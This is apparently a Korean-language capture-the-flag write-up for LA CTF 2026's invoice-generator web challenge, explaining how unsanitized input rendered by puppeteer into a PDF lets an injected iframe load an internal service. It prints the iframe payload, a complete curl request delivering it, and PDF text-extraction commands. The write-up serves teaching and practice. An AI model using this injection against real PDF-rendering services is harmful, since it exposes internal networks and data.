---
title: "LA CTF 2026 | lactf-invoice-generator"
date: 2026-02-10 01:00:00 +0900
categories: [LA CTF 2026, Web]
tags: [Web]
toc: true
comments: false
---

## TL;DR
인보이스 생성 기능이 사용자 입력을 sanitize 없이 HTML에 그대로 삽입하고, 
이를 puppeteer로 내부망에서 렌더링한 뒤 PDF로 출력한다.  
`item` 필드에 `<iframe>` 또는 `<object>`를 주입해 내부 컨테이너의 `/flag`를 렌더링시키면, 
PDF에 플래그가 그대로 찍히고 외부에서 추출 가능하다.

# Overview
**lactf-invoice-generator**는 “구매한 물품 목록을 PDF 인보이스로 만들어주는” 웹 서비스다.

- 외부에 노출된 서비스: `invoice-generator`
- 내부망에만 존재하는 서비스: `flag` (외부에서 직접 접근 불가)

핵심은 **인보이스 HTML을 생성할 때 사용자 입력을 그대로 넣고**, 
서버에서 **puppeteer(Headless Chrome)**로 렌더링해 **PDF로 저장**한다는 점이다.

# Solution
### 1) Recon
- 입력값(`name`, `item`, `cost`, `datePurchased`)이 인보이스 HTML에 그대로 삽입된다.
- 서버는 puppeteer로 HTML을 렌더링한 뒤 PDF로 저장한다:
  - `page.setContent()` → `page.pdf()`
- 즉, 입력에 HTML 태그를 넣으면 텍스트가 아니라 브라우저가 HTML로 해석/렌더링한다.

### 2) Root cause
사용자 입력을 HTML에 삽입할 때 escape/sanitize가 없고, 이를 내부망에서 실행되는 headless chrome이 렌더링한다.  
따라서 HTML injection을 통해 브라우저가 내부 서비스(`http://flag:8081/flag`)를 로드하도록 유도할 수 있다.

### 3) Exploit
`item` 필드에 내부 서비스로 향하는 `<iframe>`(또는 `<object>`)를 주입한다.  
렌더링 결과가 PDF로 굽혀지므로, PDF 안에 내부 페이지 내용(= flag)이 포함된다.

### 4) Flag
생성된 `invoice.pdf`에서 텍스트를 추출하면 플래그 문자열이 나온다.

# Solver
## 1) Exploit Payload
`item` 필드에 아래를 주입:

```html
<iframe src="http://flag:8081/flag" style="width:900px;height:300px;border:3px solid black"></iframe>
```

## 2) Request
```bash
curl -s -X POST "https://<INSTANCE>/generate-invoice" \
  -H "Content-Type: application/json" \
  -d '{
    "name":"test",
    "item":"<iframe src=\"http://flag:8081/flag\" style=\"width:900px;height:300px;border:3px solid black\"></iframe>",
    "cost":"1",
    "datePurchased":"2026-01-01"
  }' --output invoice.pdf
```

## 3) Extraction from PDF
```bash
sudo apt-get install -y poppler-utils
pdftotext invoice.pdf - | grep -o 'lactf{[^}]*}'
```

## 4) Result
puppeteer가 내부망에서만 접근 가능한 `flag` 서버 페이지를 로드하고, 그 렌더링 결과가 PDF로 저장된다.  
따라서 PDF에서 플래그 문자열을 추출할 수 있다.

```text
$ pdftotext invoice.pdf - | grep -o 'lactf{[^}]*}'
lactf{...}
```

**Flag:** `lactf{plz_s4n1t1z3_y0ur_purch4s3_l1st}`

---

## solve.py
```bash
python3 solve.py --base "<INSTANCE URL>" --extract
```
